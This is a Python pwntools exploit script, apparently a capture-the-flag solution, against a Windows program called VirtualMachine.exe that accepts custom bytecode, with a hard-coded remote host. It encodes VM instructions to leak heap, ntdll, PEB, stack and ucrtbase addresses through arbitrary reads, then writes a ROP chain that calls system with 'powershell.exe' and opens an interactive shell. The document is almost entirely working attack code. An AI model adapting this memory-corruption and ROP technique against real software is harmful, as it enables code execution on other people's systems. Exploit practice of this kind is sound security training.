#!/usr/bin/env python3
from winpwn import *
from pwn import flat, p16, u16, log
from os.path import normpath
import struct
import pwn

# =========================================================
#                          SETUP                         
# =========================================================
exe = r'..\X64\Release\VirtualMachine.exe'
pe  = winfile(exe)
pwn.context.log_level = context.log_level = 'info'
pwn.context.newline = context.newline = '\n'
pwn.context.arch = context.arch = 'amd64'
pwn.context.endian = context.endian = 'little'
context.windbgx = normpath('WinDbgX.exe')
host, port = '18.138.240.200', 9001

def initialize():
    if pwn.args.REMOTE:
        return remote(host, port)
    else:
        io = process(exe)
        if pwn.args.DBG:
            windbgx.attach(io, script=windbgscript)
        return io

windbgscript = f'''
.scriptload "D:\\Apps\\WinPwn Suite\\scripts\\telescope.js"
~0s

bu !Panic
bu VirtualMachine!VirtualMachine::Execute+0x4f2
'''

# =========================================================
#                           ENUMS
# =========================================================
R0 = 0x0
R1 = 0x1

OP_LD     = 0x2
OP_ST     = 0x3
OP_PUTS   = 0x4
OP_ALLOC  = 0xB
OP_GETC   = 0xD

FLAG_DISABLED = 0x0
FLAG_ENABLED = 0x1

# =========================================================
#                  INSTRUCTION ENCODING
# =========================================================
def make_instr(opcode: int, payload: int) -> bytes:
    instr =  opcode | (payload << 4)
    return struct.pack("<H", instr)

def debug_instr(name: str, instr: bytes):
    val = u16(instr)
    binary = f"{val:016b}"
    print(f"[+] {name} -> hex: {instr[::-1].hex()} | bin: {binary}")

# =========================================================
#              INSTRUCTION CONSTRUCTORS
# =========================================================
def Load(dest: int, offset: int = 0x0, flag: int = FLAG_DISABLED, index: int = 0x0) -> bytes:
    payload = ((dest & 0x7)) | ((offset & 0x1F) << 3) | ((flag & 1) << 8) | ((index & 0x7) << 9)
    instr = make_instr(OP_LD, payload)
    debug_instr("Load", instr)
    return instr

def Store(src: int, offset: int = 0x0, flag: int = FLAG_DISABLED, index: int = 0x0) -> bytes:
    payload = ((src & 0x7)) | ((offset & 0x1F) << 3) | ((flag & 1) << 8) | ((index & 0x7) << 9)
    instr = make_instr(OP_ST, payload)
    debug_instr("Store", instr)
    return instr

def Puts(offset: int, flag: int, index: int) -> bytes:
    payload = (offset & 0x1F) | ((flag & 1) << 5) | ((index & 0x7) << 6)
    instr = make_instr(OP_PUTS, payload)
    debug_instr("Puts", instr)
    return instr

def Alloc(size: int, index: int) -> bytes:
    payload = (size & 0x3F) | ((index & 0x3F) << 6)
    instr = make_instr(OP_ALLOC, payload)
    debug_instr("Alloc", instr)
    return instr

def Getc(flag: int, index: int) -> bytes:
    payload = ((flag & 1)) | ((index & 0x7) << 1)
    instr = make_instr(OP_GETC, payload)
    debug_instr("Getc", instr)
    return instr

# =========================================================
#                         EXPLOITS
# =========================================================
def sendlineafter(prompt, data):
    io.recvuntil(prompt)
    io.sendline(data)

def sendafter(prompt, data):
    io.recvuntil(prompt)
    io.send(data)

def send_instructions(instructions):
    payload = b"WHEN_YH_SEJAGO_ZAFIRR_LINZ_MSFIR"
    for instr in instructions:
        payload += instr
    sendlineafter('>>', str(len(payload)))
    sendafter('>>', payload)

def arb_read(addr: int, restore_addr: int) -> bytes:
    send_instructions([
        Alloc(0x8, 0x0),
        Getc(FLAG_ENABLED, 0x0),
        Load(R0, flag=FLAG_ENABLED, index=0x0),
        Store(R0, offset=0x1f, flag=FLAG_DISABLED),
        Puts(0x0, FLAG_ENABLED, 0x0),
        
        # restore state
        Alloc(0x8, 0x1),
        Getc(FLAG_ENABLED, 0x1),
        Load(R0, flag=FLAG_ENABLED, index=0x1),
        Store(R0, offset=0x1f, flag=FLAG_DISABLED),
    ])
    sendafter('>>', p64((addr-0x8) << 8 | 0x10))
    io.recv(1)
    leak = io.recvline()
    sendafter('>>', p64(((restore_addr+0x10) << 8 | 0x10)))

    return leak

def rop_to_stack(addr: int, restore_addr: int, data: bytes, param: bytes) -> None:
    send_instructions([
        Alloc(0x8, 0x0),
        Getc(FLAG_ENABLED, 0x0),
        Load(R0, flag=FLAG_ENABLED, index=0x0),
        Store(R0, offset=0x1f, flag=FLAG_DISABLED),
        Getc(FLAG_ENABLED, 0x0),
        
        # restore state
        Alloc(0x8, 0x1),
        Getc(FLAG_ENABLED, 0x1),
        Load(R0, flag=FLAG_ENABLED, index=0x1),
        Store(R0, offset=0x1f, flag=FLAG_DISABLED),

        Alloc(0x20, 0x2),
        Getc(FLAG_ENABLED, 0x2),
    ])

    sendafter('>>', p64((addr-0x8) << 8 | 0x10))
    sendafter('>>', data)
    sendafter('>>', p64(((restore_addr+0x10) << 8 | 0x10)))
    sendafter('>>', param)

def exploit():
    global io
    io = initialize()

    heap_lock_offset = 0x2c0
    heap_encoding_offset = 0x88

    send_instructions([
        Alloc(0x8, 0x0),
        Load(R0, 0x18, flag=FLAG_ENABLED, index=0x0),
        Store(R0, flag=FLAG_ENABLED, index=0x0),
        Puts(0x0, FLAG_ENABLED, 0x0),
    ])

    io.recvuntil('Executing...\n')
    heap = u64(io.recv(6).ljust(8, '\x00')) - 0x150
    heap_lock_addr = heap + heap_lock_offset
    
    io.recvuntil('ran: ')
    stack_offset = int(io.recvuntil('\n').strip()) + 0x221

    ntdll_base = u64(arb_read(heap_lock_addr, heap+0x9b0).strip().ljust(8, '\x00')) - 0x00000000001d5110
    ptr_to_peb_addr = ntdll_base + 0x00000000001cf218

    # pause()
    peb = u64(arb_read(ptr_to_peb_addr, heap+0x9d0).strip().ljust(8, '\x00')) - 0x0000000000000240
    ptr_to_stack_addr = peb + 0x1008 + 2
    log.info("ptr_to_stack_addr: %#x", ptr_to_stack_addr)

    stack = u64(arb_read(ptr_to_stack_addr, heap+0x9f0).strip().ljust(8, '\x00')) << 16
    rip = stack - 0x1000 + stack_offset + 0x48 - 0x90
    ptr_to_ucrt_addr = rip + 0x20
    
    ucrtbase_base = u64(arb_read(ptr_to_ucrt_addr, heap+0xa10).strip().ljust(8, '\x00')) - 0x0000000000137c98
    system = ucrtbase_base + 0x00000000000db310
    pop_rcx = ucrtbase_base + 0x20ff1
    ret = ucrtbase_base + 0x105d

    # # pause()
    rop_to_stack(rip, heap+0xa30, flat([
        pop_rcx, 0x0,
        pop_rcx, heap+0x0000000000000a88,
        ret,
        system,
    ]), b'powershell.exe') 

    log.info('heap base: %#x', heap)
    log.info('ntdll base: %#x', ntdll_base)
    log.info('peb: %#x', peb)
    log.info('ucrt base: %#x', ucrtbase_base)
    log.info('stack: %#x', stack)
    log.info('rip: %#x', rip)

    io.interactive()

if __name__ == '__main__':
    exploit()